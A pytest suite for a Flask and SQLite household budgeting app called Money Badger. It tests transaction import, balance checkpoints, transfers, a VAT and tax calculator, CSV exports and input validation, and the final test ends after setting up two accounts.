"""Core-logic tests for Money Badger. Run: venv/bin/pytest tests/ -q"""
import csv
import io
import os
import sqlite3
import sys
import tempfile
from datetime import date

import pytest

TEST_DB = os.path.join(tempfile.mkdtemp(prefix='money-badger-test-'), 'test.db')
os.environ['BUDGET_DB'] = TEST_DB
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import app as badger  # noqa: E402  (import after env var so init_db hits the test DB)
from app import parse_flexible_date, next_month_year  # noqa: E402
from presets import apply_preset, load_preset  # noqa: E402

# Migrations create an empty schema; the starter data lives in a preset, same as
# on a real first run. Tests build on the English household one.
PRESET = load_preset('household-en')
_seed_db = sqlite3.connect(TEST_DB)
apply_preset(_seed_db, PRESET)

# Extra accounts the balance and transfer tests need beyond what the preset ships.
for _name, _type in [('Third account', 'bank'), ('Business account', 'bank'),
                     ('Revolut', 'bank')]:
    _seed_db.execute('INSERT OR IGNORE INTO accounts (name, type) VALUES (?, ?)', (_name, _type))

_seed_db.commit()
_seed_db.close()


@pytest.fixture()
def client():
    badger.app.config['TESTING'] = True
    with badger.app.test_client() as c:
        yield c


@pytest.fixture()
def db():
    import sqlite3
    conn = sqlite3.connect(TEST_DB)
    conn.row_factory = sqlite3.Row
    yield conn
    conn.close()


def _bulk(client, txs):
    return client.post('/api/transactions/bulk', json=txs).get_json()


def _accounts(client):
    return {a['name']: a for a in client.get('/api/accounts').get_json()}


def _set_balance(client, db, name, balance):
    aid = db.execute('SELECT id FROM accounts WHERE name=?', (name,)).fetchone()['id']
    client.put(f'/api/accounts/{aid}', json={'balance': balance})
    return aid


# ── unit: helpers ─────────────────────────────────────────────────────────────

def test_parse_flexible_date():
    assert parse_flexible_date('05/07/2026').strftime('%Y-%m-%d') == '2026-07-05'
    assert parse_flexible_date('2026-07-05').strftime('%Y-%m-%d') == '2026-07-05'
    assert parse_flexible_date('05.07.2026').strftime('%Y-%m-%d') == '2026-07-05'
    assert parse_flexible_date('2026-07-05 12:30:00').strftime('%Y-%m-%d') == '2026-07-05'
    assert parse_flexible_date('garbage') is None
    assert parse_flexible_date('') is None
    assert parse_flexible_date(None) is None


def test_next_month_year():
    assert next_month_year(12, 2026) == (1, 2027)
    assert next_month_year(1, 2026) == (2, 2026)


# ── bulk import ───────────────────────────────────────────────────────────────

def test_bulk_expense_resolves_category(client, db):
    res = _bulk(client, [{'date': '01/03/2030', 'amount': 50, 'account': 'Main account',
                          'category': 'Groceries', 'description': 'test grocery',
                          'hash': 'h-groc-1'}])
    assert res['inserted'] == 1
    tx = db.execute("SELECT * FROM transactions WHERE source_hash='h-groc-1'").fetchone()
    assert tx['category_id'] is not None
    assert tx['income_category_id'] is None
    assert tx['date'] == '2030-03-01'


def test_bulk_income_bumps_received(client, db):
    _bulk(client, [{'date': '02/03/2030', 'amount': 1000, 'account': 'Main account',
                    'category': 'Salary', 'tx_type': 'Income', 'hash': 'h-sal-1'}])
    row = db.execute('''SELECT e.received FROM income_entries e
                        JOIN income_categories c ON e.category_id=c.id
                        WHERE c.name='Salary' AND e.month=3 AND e.year=2030''').fetchone()
    assert row['received'] == 1000


def test_bulk_duplicate_hash_no_double_bump(client, db):
    tx = {'date': '03/03/2030', 'amount': 500, 'account': 'Main account',
          'category': 'Salary', 'tx_type': 'Income', 'hash': 'h-dup-1'}
    _bulk(client, [tx])
    res = _bulk(client, [tx])
    assert res['inserted'] == 0
    row = db.execute('''SELECT SUM(e.received) AS r FROM income_entries e
                        JOIN income_categories c ON e.category_id=c.id
                        WHERE c.name='Salary' AND e.month=3 AND e.year=2030''').fetchone()
    assert row['r'] == 1500  # 1000 from previous test + 500 once, not twice


def test_bulk_check_me_literal_stays_unresolved(client, db):
    _bulk(client, [{'date': '04/03/2030', 'amount': 77, 'account': 'Main account',
                    'category': 'CHECK ME', 'hash': 'h-chk-1'}])
    tx = db.execute("SELECT * FROM transactions WHERE source_hash='h-chk-1'").fetchone()
    assert tx['category_id'] is None and tx['income_category_id'] is None


# ── computed balances ─────────────────────────────────────────────────────────

def test_expense_decreases_balance(client, db):
    _set_balance(client, db, 'Main account', 1000)
    _bulk(client, [{'date': '05/03/2030', 'amount': 100, 'account': 'Main account',
                    'category': 'Groceries', 'hash': 'h-bal-1'}])
    assert _accounts(client)['Main account']['balance'] == 900


def test_categorized_income_increases_balance(client, db):
    _set_balance(client, db, 'Partner account', 1000)
    _bulk(client, [{'date': '05/03/2030', 'amount': 200, 'account': 'Partner account',
                    'category': 'Salary', 'tx_type': 'Income', 'hash': 'h-bal-2'}])
    assert _accounts(client)['Partner account']['balance'] == 1200


def test_uncategorized_income_increases_balance(client, db):
    """tx_type='Income' with no category yet (CHECK ME inbox) must still count as +."""
    _set_balance(client, db, 'Third account', 1000)
    _bulk(client, [{'date': '05/03/2030', 'amount': 300, 'account': 'Third account',
                    'tx_type': 'Income', 'category': '', 'hash': 'h-bal-3'}])
    assert _accounts(client)['Third account']['balance'] == 1300


def test_transfer_moves_between_accounts(client, db):
    _set_balance(client, db, 'Cash', 100)
    src = 'Main account'
    _set_balance(client, db, src, 500)
    _bulk(client, [{'date': '06/03/2030', 'amount': 150, 'account': src,
                    'account_to': 'Cash', 'tx_type': 'Money Transfer',
                    'category': '', 'hash': 'h-tr-1'}])
    accts = _accounts(client)
    assert accts[src]['balance'] == 350
    assert accts['Cash']['balance'] == 250


def test_balance_edit_checkpoint(client, db):
    """Manual balance edit sets a checkpoint; older transactions no longer count."""
    _set_balance(client, db, 'Revolut', 111)
    _bulk(client, [{'date': '07/03/2030', 'amount': 11, 'account': 'Revolut',
                    'category': 'Groceries', 'hash': 'h-cp-1'}])
    assert _accounts(client)['Revolut']['balance'] == 100
    _set_balance(client, db, 'Revolut', 999)
    assert _accounts(client)['Revolut']['balance'] == 999


# ── transaction editing ───────────────────────────────────────────────────────

def test_update_income_amount_adjusts_received(client, db):
    _bulk(client, [{'date': '08/03/2030', 'amount': 100, 'account': 'Main account',
                    'category': 'Benefits', 'tx_type': 'Income', 'hash': 'h-upd-1'}])
    tid = db.execute("SELECT id FROM transactions WHERE source_hash='h-upd-1'").fetchone()['id']
    client.put(f'/api/transactions/{tid}', json={'amount': 250})
    row = db.execute('''SELECT e.received FROM income_entries e
                        JOIN income_categories c ON e.category_id=c.id
                        WHERE c.name='Benefits' AND e.month=3 AND e.year=2030''').fetchone()
    assert row['received'] == 250


def test_delete_transaction_rolls_back_received(client, db):
    _bulk(client, [{'date': '09/03/2030', 'amount': 400, 'account': 'Main account',
                    'category': 'Loans', 'tx_type': 'Income', 'hash': 'h-del-1'}])
    tid = db.execute("SELECT id FROM transactions WHERE source_hash='h-del-1'").fetchone()['id']
    res = client.delete(f'/api/transactions/{tid}')
    assert res.status_code == 200
    assert db.execute('SELECT 1 FROM transactions WHERE id=?', (tid,)).fetchone() is None
    row = db.execute('''SELECT e.received FROM income_entries e
                        JOIN income_categories c ON e.category_id=c.id
                        WHERE c.name='Loans' AND e.month=3 AND e.year=2030''').fetchone()
    assert (row['received'] if row else 0) == 0


def test_delete_missing_transaction_404(client):
    assert client.delete('/api/transactions/999999').status_code == 404


def test_update_transaction_bad_date_400(client, db):
    _bulk(client, [{'date': '10/03/2030', 'amount': 10, 'account': 'Main account',
                    'category': 'Groceries', 'hash': 'h-bd-1'}])
    tid = db.execute("SELECT id FROM transactions WHERE source_hash='h-bd-1'").fetchone()['id']
    assert client.put(f'/api/transactions/{tid}', json={'date': 'nonsense'}).status_code == 400


# ── CHECK ME bucketing ────────────────────────────────────────────────────────

def test_unreviewed_buckets_by_tx_type(client):
    _bulk(client, [
        {'date': '11/03/2030', 'amount': 5, 'account': 'Main account', 'category': '',
         'tx_type': 'Expense', 'hash': 'h-un-e'},
        {'date': '11/03/2030', 'amount': 6, 'account': 'Main account', 'category': '',
         'tx_type': 'Income', 'hash': 'h-un-i'},
    ])
    data = client.get('/api/transactions/unreviewed').get_json()
    exp_hashes = {t['amount'] for t in data['expenses']}
    inc_hashes = {t['amount'] for t in data['income']}
    assert 5 in exp_hashes and 6 in inc_hashes


# ── income categories ─────────────────────────────────────────────────────────

def test_delete_income_category_in_use_is_clean_error(client, db):
    """Deleting an income category referenced by transactions must 400, not 500."""
    client.post('/api/income-categories', json={'name': 'TempCat'})
    cid = db.execute("SELECT id FROM income_categories WHERE name='TempCat'").fetchone()['id']
    _bulk(client, [{'date': '12/03/2030', 'amount': 9, 'account': 'Main account',
                    'category': 'TempCat', 'tx_type': 'Income', 'hash': 'h-ic-1'}])
    res = client.delete(f'/api/income-categories/{cid}')
    assert res.status_code == 400
    # unused category deletes fine
    client.post('/api/income-categories', json={'name': 'TempCat2'})
    cid2 = db.execute("SELECT id FROM income_categories WHERE name='TempCat2'").fetchone()['id']
    assert client.delete(f'/api/income-categories/{cid2}').status_code == 200


# ── budget copy-next ──────────────────────────────────────────────────────────

def test_copy_basic_next_month(client, db):
    cat = db.execute("SELECT id FROM categories WHERE name='Groceries' AND parent_id IS NULL").fetchone()
    client.post('/api/basic', json={'category_id': cat['id'], 'amount': 1500, 'month': 5, 'year': 2030})
    client.post('/api/basic/copy-next', json={'month': 5, 'year': 2030})
    row = db.execute('''SELECT amount FROM basic_budgets_monthly
                        WHERE category_id=? AND month=6 AND year=2030''', (cat['id'],)).fetchone()
    assert row['amount'] == 1500


def test_copy_income_next_keeps_received(client, db):
    cat = db.execute("SELECT id FROM income_categories WHERE name='Bonus'").fetchone()
    client.put('/api/income-entries', json={'category_id': cat['id'], 'month': 5, 'year': 2030,
                                            'planned': 20000, 'received': 0, 'note': 'plan'})
    # next month already has received money — copy must not clobber it
    client.put('/api/income-entries', json={'category_id': cat['id'], 'month': 6, 'year': 2030,
                                            'planned': 0, 'received': 123, 'note': ''})
    client.post('/api/income-entries/copy-next', json={'month': 5, 'year': 2030})
    row = db.execute('''SELECT planned, received FROM income_entries
                        WHERE category_id=? AND month=6 AND year=2030''', (cat['id'],)).fetchone()
    assert row['planned'] == 20000
    assert row['received'] == 123


# ── calculator ────────────────────────────────────────────────────────────────

def _calc_setup(client, db, vat='0.23', tax='0.085'):
    """Configure the calculator the way the setup screen would, and return the item id."""
    client.put('/api/settings', json={
        'calc.enabled': '1',
        'calc.vat_rate': vat,
        'calc.tax_rate': tax,
        'calc.income_category': 'Contract work',
        'calc.vat_category': 'Taxes: VAT',
        'calc.tax_category': 'Taxes: Income tax',
        'calc.apply_note': 'Calculator',
    })
    db.execute("INSERT OR IGNORE INTO income_categories (name, sort_order) VALUES ('Contract work', 50)")
    db.commit()
    existing = db.execute("SELECT id FROM calc_items WHERE name='Hours'").fetchone()
    if existing:
        return existing['id']
    return client.post('/api/calc/items',
                       json={'name': 'Hours', 'unit': 'h', 'time_input': True, 'rate': 0}
                       ).get_json()['id']


def _calc_plan(client, item_id, month, year, qty, rate):
    return client.put('/api/calc/plan', json={
        'month': month, 'year': year,
        'entries': [{'item_id': item_id, 'qty': qty, 'rate': rate}],
    })


def test_calc_totals_are_quantity_times_rate(client, db):
    item = _calc_setup(client, db)
    _calc_plan(client, item, 4, 2040, 100, 100)   # 10 000 subtotal
    data = client.get('/api/calc?month=4&year=2040').get_json()
    assert data['subtotal'] == 10000
    assert data['vat'] == 2300
    assert data['tax'] == 850
    assert data['gross'] == 12300


def test_calc_apply_writes_income_and_both_taxes(client, db):
    item = _calc_setup(client, db)
    _calc_plan(client, item, 5, 2040, 100, 100)
    res = client.post('/api/calc/apply', json={'month': 5, 'year': 2040})
    assert res.status_code == 200, res.get_json()
    assert res.get_json()['gross'] == 12300

    planned = db.execute('''SELECT e.planned FROM income_entries e
                            JOIN income_categories c ON e.category_id=c.id
                            WHERE c.name='Contract work' AND e.month=5 AND e.year=2040''').fetchone()
    assert planned['planned'] == 12300
    amounts = dict(db.execute('''SELECT c.name, a.amount FROM additional_budgets a
                                 JOIN categories c ON a.category_id=c.id
                                 WHERE a.month=5 AND a.year=2040''').fetchall())
    assert amounts['VAT'] == 2300
    assert amounts['Income tax'] == 850


def test_calc_apply_twice_replaces_rather_than_stacks(client, db):
    item = _calc_setup(client, db)
    _calc_plan(client, item, 6, 2040, 100, 100)
    client.post('/api/calc/apply', json={'month': 6, 'year': 2040})
    _calc_plan(client, item, 6, 2040, 80, 100)
    client.post('/api/calc/apply', json={'month': 6, 'year': 2040})

    rows = db.execute('''SELECT a.amount FROM additional_budgets a
                         JOIN categories c ON a.category_id=c.id
                         WHERE c.name='VAT' AND a.month=6 AND a.year=2040''').fetchall()
    assert len(rows) == 1
    assert rows[0]['amount'] == 1840  # 8000 * 0.23


def test_calc_adjustment_is_valued_at_its_item_rate(client, db):
    item = _calc_setup(client, db)
    _calc_plan(client, item, 7, 2040, 100, 100)
    client.post('/api/calc/adjustment', json={'month': 7, 'year': 2040, 'item_id': item,
                                              'sign': '-', 'qty': 10, 'description': 'cancelled'})
    data = client.get('/api/calc?month=7&year=2040').get_json()
    assert data['adjustments'][0]['total'] == -1000
    assert data['subtotal'] == 9000


def test_calc_blank_rate_means_not_applicable(client, db):
    """An empty rate is not a rate of zero: the amount is None and apply skips it."""
    item = _calc_setup(client, db, vat='', tax='0.085')
    _calc_plan(client, item, 8, 2040, 100, 100)
    data = client.get('/api/calc?month=8&year=2040').get_json()
    assert data['vat'] is None
    assert data['gross'] == 10000  # no VAT added on top
    client.post('/api/calc/apply', json={'month': 8, 'year': 2040})
    vat_rows = db.execute('''SELECT 1 FROM additional_budgets a JOIN categories c ON a.category_id=c.id
                             WHERE c.name='VAT' AND a.month=8 AND a.year=2040''').fetchall()
    assert vat_rows == []


def test_calc_apply_reports_a_missing_category_instead_of_pretending(client, db):
    """The old version returned ok and wrote nothing when a category was missing."""
    _calc_setup(client, db)
    client.put('/api/settings', json={'calc.income_category': 'Nonexistent category'})
    res = client.post('/api/calc/apply', json={'month': 9, 'year': 2040})
    assert res.status_code == 400
    assert 'Nonexistent category' in res.get_json()['error']
    client.put('/api/settings', json={'calc.income_category': 'Contract work'})


def test_calc_deleting_an_item_takes_its_months_with_it(client, db):
    item = _calc_setup(client, db)
    _calc_plan(client, item, 10, 2040, 5, 10)
    client.delete(f'/api/calc/items/{item}')
    assert db.execute('SELECT count(*) FROM calc_entries WHERE item_id=?', (item,)).fetchone()[0] == 0
    assert db.execute('SELECT count(*) FROM calc_items WHERE id=?', (item,)).fetchone()[0] == 0


def test_calc_plan_rejects_an_unknown_item(client, db):
    _calc_setup(client, db)
    res = _calc_plan(client, 999999, 11, 2040, 1, 1)
    assert res.status_code == 400

# ── effective basics ──────────────────────────────────────────────────────────

def test_monthly_basic_overrides_global(client, db):
    cat = db.execute("SELECT id FROM categories WHERE name='Dining' AND parent_id IS NULL").fetchone()
    db.execute('INSERT OR REPLACE INTO basic_budgets (category_id, amount) VALUES (?, 400)', (cat['id'],))
    db.commit()
    basics_before = badger.get_effective_basics(db, 7, 2030)
    assert basics_before[cat['id']] == 400
    client.post('/api/basic', json={'category_id': cat['id'], 'amount': 999, 'month': 7, 'year': 2030})
    basics_after = badger.get_effective_basics(db, 7, 2030)
    assert basics_after[cat['id']] == 999
    # other months still see the global value
    assert badger.get_effective_basics(db, 8, 2030)[cat['id']] == 400


# ── overview + export ─────────────────────────────────────────────────────────

def test_overview_shape_and_math(client, db):
    _bulk(client, [{'date': '15/06/2031', 'amount': 120, 'account': 'Main account',
                    'category': 'Groceries', 'hash': 'h-ov-1'},
                   {'date': '20/06/2031', 'amount': 80, 'account': 'Main account',
                    'category': 'Pets: Vet', 'hash': 'h-ov-2'},
                   {'date': '21/06/2031', 'amount': 999, 'account': 'Main account',
                    'account_to': 'Cash', 'tx_type': 'Money Transfer',
                    'category': '', 'hash': 'h-ov-3'}])
    d = client.get('/api/overview?year=2031').get_json()
    assert len(d['months']) == 12
    june = d['months'][5]
    assert june['spent'] == 200            # transfer excluded
    by_name = {c['name']: c for c in d['categories']}
    assert by_name['Groceries']['monthly'][5] == 120
    assert by_name['Pets']['monthly'][5] == 80  # child rolled up to parent


def test_export_transactions_csv(client):
    res = client.get('/api/export/transactions.csv?year=2031')
    assert res.status_code == 200
    body = res.get_data(as_text=True)
    assert body.startswith('Date;Amount;Account')
    assert '2031-06-15;120.00;Main account' in body


def test_export_budget_csv(client, db):
    cat = db.execute("SELECT id FROM categories WHERE name='Groceries' AND parent_id IS NULL").fetchone()
    client.post('/api/basic', json={'category_id': cat['id'], 'amount': 900, 'month': 6, 'year': 2031})
    res = client.get('/api/export/budget.csv?year=2031')
    body = res.get_data(as_text=True)
    assert 'Year;Month;Category;Basic;Additional;Planned;Spent' in body
    assert '2031;6;Groceries;900.00;0.00;900.00;120.00' in body


def test_manual_transfer_moves_balances(client, db):
    _set_balance(client, db, 'Business account', 300)
    _set_balance(client, db, 'Cash', 0)
    res = client.post('/api/transactions', json={
        'date': '2031-07-06', 'amount': 250, 'account': 'Business account',
        'account_to': 'Cash', 'tx_type': 'Money Transfer', 'description': ''})
    assert res.status_code == 200
    accts = _accounts(client)
    assert accts['Business account']['balance'] == 50
    assert accts['Cash']['balance'] == 250


def test_manual_transfer_requires_both_accounts(client):
    res = client.post('/api/transactions', json={
        'date': '2031-07-06', 'amount': 10, 'account': 'Main account',
        'tx_type': 'Money Transfer'})
    assert res.status_code == 400


# ── audit 2026-07-27: the three spend aggregations must agree ─────────────────

def _budget_spent(client, month, year):
    return client.get(f'/api/budget?month={month}&year={year}').get_json()['spent']


def test_budget_spent_matches_overview(client, db):
    """/api/budget, /api/overview and budget.csv each aggregate spending separately.
    /api/budget used to filter only tx_type != 'Income', so a categorized transfer
    counted as spending on one page and not on the other."""
    year, month = 2032, 4
    _bulk(client, [
        {'date': f'05/0{month}/{year}', 'amount': 100, 'account': 'Main account',
         'category': 'Groceries', 'description': 'food', 'hash': 'agg-exp'},
        # a transfer between our own accounts, categorized like any other row
        {'date': f'06/0{month}/{year}', 'amount': 400, 'account': 'Main account',
         'account_to': 'Third account', 'tx_type': 'Money Transfer',
         'category': 'Groceries', 'description': 'to third', 'hash': 'agg-tr'},
    ])
    spent = _budget_spent(client, month, year)
    budget_total = sum(abs(v) for v in spent.values())

    ov = client.get(f'/api/overview?year={year}').get_json()
    overview_total = ov['months'][month - 1]['spent']

    assert budget_total == overview_total == 100


def test_transfer_with_category_is_not_spending(client, db):
    year, month = 2032, 5
    _bulk(client, [{'date': f'07/0{month}/{year}', 'amount': 250, 'account': 'Main account',
                    'account_to': 'Third account', 'tx_type': 'Money Transfer',
                    'category': 'Groceries', 'hash': 'tr-cat'}])
    assert sum(abs(v) for v in _budget_spent(client, month, year).values()) == 0


def test_balance_adjust_is_not_spending(client, db):
    year, month = 2032, 6
    db.execute("""INSERT INTO transactions (date, amount, account, tx_type, description,
                  category_id, month, year)
                  SELECT ?, 500, 'Main account', 'Balance Adjust', 'adjust', id, ?, ?
                  FROM categories WHERE name='Groceries' AND parent_id IS NULL""",
               (f'{year}-0{month}-01', month, year))
    db.commit()
    assert sum(abs(v) for v in _budget_spent(client, month, year).values()) == 0


# ── audit 2026-07-27: expense/income category name collisions ────────────────

def test_income_wins_name_collision(client, db):
    """'Gifts' exists as both an expense and an income category. Resolving expense-first
    filed income rows under the expense category, so received was never credited."""
    assert db.execute("SELECT 1 FROM categories WHERE name='Gifts'").fetchone()
    assert db.execute("SELECT 1 FROM income_categories WHERE name='Gifts'").fetchone()

    _bulk(client, [{'date': '10/08/2032', 'amount': 300, 'account': 'Main account',
                    'category': 'Gifts', 'tx_type': 'Income', 'hash': 'coll-inc'}])
    tx = db.execute("SELECT * FROM transactions WHERE source_hash='coll-inc'").fetchone()
    assert tx['income_category_id'] is not None
    assert tx['category_id'] is None
    row = db.execute('''SELECT e.received FROM income_entries e JOIN income_categories c
                        ON e.category_id=c.id WHERE c.name='Gifts'
                          AND e.month=8 AND e.year=2032''').fetchone()
    assert row['received'] == 300
    # and it must not show up as spending
    assert sum(abs(v) for v in _budget_spent(client, 8, 2032).values()) == 0


def test_expense_never_gets_income_category(client, db):
    """An expense whose category name only exists on the income side must stay
    unresolved (→ CHECK ME), never carry an income_category_id. The mismatch made
    tx_type and income_category_id disagree about direction."""
    _bulk(client, [{'date': '11/08/2032', 'amount': 90, 'account': 'Main account',
                    'category': 'Loans', 'tx_type': 'Expense', 'hash': 'exp-inc-cat'}])
    tx = db.execute("SELECT * FROM transactions WHERE source_hash='exp-inc-cat'").fetchone()
    assert tx['income_category_id'] is None


def test_assigning_income_category_sets_tx_type(client, db):
    _bulk(client, [{'date': '12/08/2032', 'amount': 70, 'account': 'Main account',
                    'category': 'CHECK ME', 'hash': 'assign-inc'}])
    tx = db.execute("SELECT * FROM transactions WHERE source_hash='assign-inc'").fetchone()
    cat = db.execute("SELECT id FROM income_categories WHERE name='Refunds'").fetchone()
    client.put(f"/api/transactions/{tx['id']}/income-category",
               json={'income_category_id': cat['id']})
    after = db.execute('SELECT * FROM transactions WHERE id=?', (tx['id'],)).fetchone()
    assert after['tx_type'] == 'Income'
    assert after['category_id'] is None


# ── audit 2026-07-27: input validation ───────────────────────────────────────

def test_non_finite_amount_rejected(client):
    """float('1e400') is inf; it reaches SQLite and makes json.dumps emit bare
    Infinity, which is invalid JSON — one row then breaks every endpoint."""
    res = client.post('/api/transactions', json={
        'date': '2032-09-01', 'amount': '1e400', 'account': 'Main account', 'description': 'x'})
    assert res.status_code == 400


def test_garbage_month_rejected(client):
    assert client.get('/api/budget?month=abc&year=2032').status_code == 400
    assert client.get('/api/budget?month=99&year=2032').status_code == 400


def test_unknown_tx_type_rejected(client, db):
    _bulk(client, [{'date': '02/09/2032', 'amount': 10, 'account': 'Main account',
                    'category': 'Groceries', 'hash': 'bad-type'}])
    tx = db.execute("SELECT id FROM transactions WHERE source_hash='bad-type'").fetchone()
    assert client.put(f"/api/transactions/{tx['id']}", json={'tx_type': 'Nonsense'}).status_code == 400


def test_transfer_edit_requires_destination(client, db):
    """The create path refused a transfer with no destination; the edit path allowed it,
    and the amount was then debited from one account and credited to nothing."""
    _bulk(client, [{'date': '03/09/2032', 'amount': 20, 'account': 'Main account',
                    'category': 'Groceries', 'hash': 'to-transfer'}])
    tx = db.execute("SELECT id FROM transactions WHERE source_hash='to-transfer'").fetchone()
    res = client.put(f"/api/transactions/{tx['id']}", json={'tx_type': 'Money Transfer'})
    assert res.status_code == 400


# ── audit 2026-07-27: silent data loss ───────────────────────────────────────

def test_bulk_reports_accepted_hashes(client):
    """The caller marks hashes as pushed from this list. A row the server skips must
    NOT appear in it, or push_actuals records it as done and never retries — the
    transaction then silently never exists."""
    res = client.post('/api/transactions/bulk', json=[
        {'date': '01/10/2032', 'amount': 10, 'account': 'Main account',
         'category': 'Groceries', 'hash': 'acc-good'},
        {'date': 'not-a-date', 'amount': 20, 'account': 'Main account',
         'category': 'Groceries', 'hash': 'acc-baddate'},
    ]).get_json()
    assert 'acc-good' in res['accepted']
    assert 'acc-baddate' not in res['accepted']
    assert res['received'] == 2


def test_bulk_accepts_already_stored_hash(client):
    """A duplicate hash is OR IGNOREd — already stored counts as accepted, otherwise
    the caller would retry it forever."""
    tx = {'date': '02/10/2032', 'amount': 30, 'account': 'Main account',
          'category': 'Groceries', 'hash': 'acc-dup'}
    client.post('/api/transactions/bulk', json=[tx])
    res = client.post('/api/transactions/bulk', json=[tx]).get_json()
    assert res['inserted'] == 0
    assert 'acc-dup' in res['accepted']


def test_income_entry_partial_update_keeps_received(client, db):
    """Editing only the note must not write back a stale `received` — that erased
    income the sync had imported in the meantime."""
    cat = db.execute("SELECT id FROM income_categories WHERE name='Salary'").fetchone()['id']
    client.put('/api/income-entries', json={'category_id': cat, 'month': 11, 'year': 2032,
                                            'planned': 5000, 'received': 0, 'note': 'first'})
    # the import pipeline credits received behind the page's back
    _bulk(client, [{'date': '05/11/2032', 'amount': 4000, 'account': 'Main account',
                    'category': 'Salary', 'tx_type': 'Income', 'hash': 'inc-partial'}])
    # user edits only the note
    client.put('/api/income-entries', json={'category_id': cat, 'month': 11, 'year': 2032,
                                            'note': 'edited'})
    row = db.execute('SELECT * FROM income_entries WHERE category_id=? AND month=11 AND year=2032',
                     (cat,)).fetchone()
    assert row['received'] == 4000
    assert row['planned'] == 5000
    assert row['note'] == 'edited'


# ── audit 2026-07-27: corrections + accounts hardening ───────────────────────

def test_mark_synced_requires_explicit_ids(client):
    """A blanket UPDATE raced the export window and flagged corrections that never
    reached a CSV. A bodyless POST also made this reachable by a cross-site form."""
    assert client.post('/api/corrections/mark-synced', json={}).status_code == 400


def test_mark_synced_only_marks_given_ids(client, db):
    _bulk(client, [{'date': '01/12/2032', 'amount': 15, 'account': 'Main account',
                    'category': 'CHECK ME', 'hash': 'corr-a'},
                   {'date': '02/12/2032', 'amount': 25, 'account': 'Main account',
                    'category': 'CHECK ME', 'hash': 'corr-b'}])
    cat = db.execute("SELECT id FROM categories WHERE name='Groceries' AND parent_id IS NULL").fetchone()['id']
    ids = []
    for h in ('corr-a', 'corr-b'):
        tid = db.execute('SELECT id FROM transactions WHERE source_hash=?', (h,)).fetchone()['id']
        client.put(f'/api/transactions/{tid}/category', json={'category_id': cat})
        ids.append(db.execute('SELECT id FROM corrections WHERE tx_id=?', (tid,)).fetchone()['id'])

    res = client.post('/api/corrections/mark-synced', json={'ids': [ids[0]]}).get_json()
    assert res['marked'] == 1
    rows = {r['id']: r['synced'] for r in db.execute('SELECT id, synced FROM corrections').fetchall()}
    assert rows[ids[0]] == 1
    assert rows[ids[1]] == 0


def test_corrections_csv_keeps_direction(client, db):
    """Every row used to be written as 'Expense', so re-categorising income round-tripped
    into Money Pro with the direction inverted."""
    _bulk(client, [{'date': '03/12/2032', 'amount': 900, 'account': 'Main account',
                    'category': 'Salary', 'tx_type': 'Income', 'hash': 'corr-inc'}])
    tid = db.execute("SELECT id FROM transactions WHERE source_hash='corr-inc'").fetchone()['id']
    cat = db.execute("SELECT id FROM categories WHERE name='Groceries' AND parent_id IS NULL").fetchone()['id']
    client.put(f'/api/transactions/{tid}/category', json={'category_id': cat})
    body = client.get('/api/corrections?synced=0').get_data(as_text=True)
    row = [l for l in body.splitlines() if '900' in l][0]
    assert ';Income;' in row


def test_new_account_anchors_to_now(client, db):
    """Accounts join transactions by name; an anchor of 0 replays all history, so a
    deleted-and-recreated account opened with a fabricated balance."""
    _bulk(client, [{'date': '04/12/2032', 'amount': 77, 'account': 'Recreated',
                    'category': 'Groceries', 'hash': 'anchor-hist'}])
    client.post('/api/accounts', json={'name': 'Recreated', 'type': 'bank'})
    acct = {a['name']: a for a in client.get('/api/accounts').get_json()}['Recreated']
    assert acct['balance'] == 0


def test_accounts_response_has_no_iban(client):
    for a in client.get('/api/accounts').get_json():
        assert 'iban' not in a


# ── audit 2026-07-27 (part 2): balance anchor is time-aware ──────────────────

def test_late_posted_transaction_before_checkpoint_is_not_counted(client, db):
    """The reported failure: read 5000 in the bank app and type it in; the next day
    the sync imports a charge the bank posted late, dated BEFORE the reading. It gets
    id > anchor and used to be subtracted from a figure that already included it."""
    _set_balance(client, db, 'Main account', 5000)
    assert _accounts(client)['Main account']['balance'] == 5000

    # imported now, dated well before the checkpoint
    _bulk(client, [{'date': '01/01/2020', 'amount': 200, 'account': 'Main account',
                    'category': 'Groceries', 'description': 'late-posted',
                    'hash': 'anchor-late'}])

    assert _accounts(client)['Main account']['balance'] == 5000


def test_transaction_after_checkpoint_still_counts(client, db):
    """The guard must not swallow ordinary new spending."""
    _set_balance(client, db, 'Main account', 5000)
    _bulk(client, [{'date': '31/12/2099', 'amount': 200, 'account': 'Main account',
                    'category': 'Groceries', 'hash': 'anchor-future'}])
    assert _accounts(client)['Main account']['balance'] == 4800


def test_same_day_as_checkpoint_still_counts(client, db):
    """Dates carry no time, so a transaction dated the checkpoint day may or may not
    have been posted when the balance was read. It keeps counting — documented
    behaviour, not an accident."""
    from datetime import datetime as _dt
    today = _dt.now().strftime('%d/%m/%Y')
    _set_balance(client, db, 'Third account', 1000)
    _bulk(client, [{'date': today, 'amount': 50, 'account': 'Third account',
                    'category': 'Groceries', 'hash': 'anchor-sameday'}])
    assert _accounts(client)['Third account']['balance'] == 950


def test_resaving_same_balance_does_not_move_anchor(client, db):
    """A no-op save used to insert a zero-amount audit row and push the anchor
    forward, freezing everything before it out of the calculation."""
    aid = _set_balance(client, db, 'Partner account', 300)
    _bulk(client, [{'date': '31/12/2099', 'amount': 100, 'account': 'Partner account',
                    'category': 'Groceries', 'hash': 'anchor-noop'}])
    assert _accounts(client)['Partner account']['balance'] == 200

    anchor_before = db.execute('SELECT balance_anchor_tx_id FROM accounts WHERE id=?',
                               (aid,)).fetchone()[0]
    n_before = db.execute("SELECT COUNT(*) FROM transactions WHERE tx_type='Balance Adjust'").fetchone()[0]

    client.put(f'/api/accounts/{aid}', json={'balance': 200})   # same as displayed

    assert db.execute('SELECT balance_anchor_tx_id FROM accounts WHERE id=?',
                      (aid,)).fetchone()[0] == anchor_before
    assert db.execute("SELECT COUNT(*) FROM transactions WHERE tx_type='Balance Adjust'").fetchone()[0] == n_before
    assert _accounts(client)['Partner account']['balance'] == 200


def test_checkpoint_records_its_date(client, db):
    aid = _set_balance(client, db, 'Cash', 120)
    row = db.execute('SELECT balance_anchor_date FROM accounts WHERE id=?', (aid,)).fetchone()
    from datetime import datetime as _dt
    assert row['balance_anchor_date'] == _dt.now().strftime('%Y-%m-%d')


def test_expense_converts_to_transfer_in_one_put(client, db):
    """What the TRANSACTIONS tab now sends when a row is switched to Transfer: type and
    destination together. Sending the type alone is still refused — the UI used to do
    exactly that, so no row could ever be converted."""
    client.post('/api/accounts', json={'name': 'From', 'type': 'bank', 'balance': 0})
    client.post('/api/accounts', json={'name': 'To', 'type': 'bank', 'balance': 0})
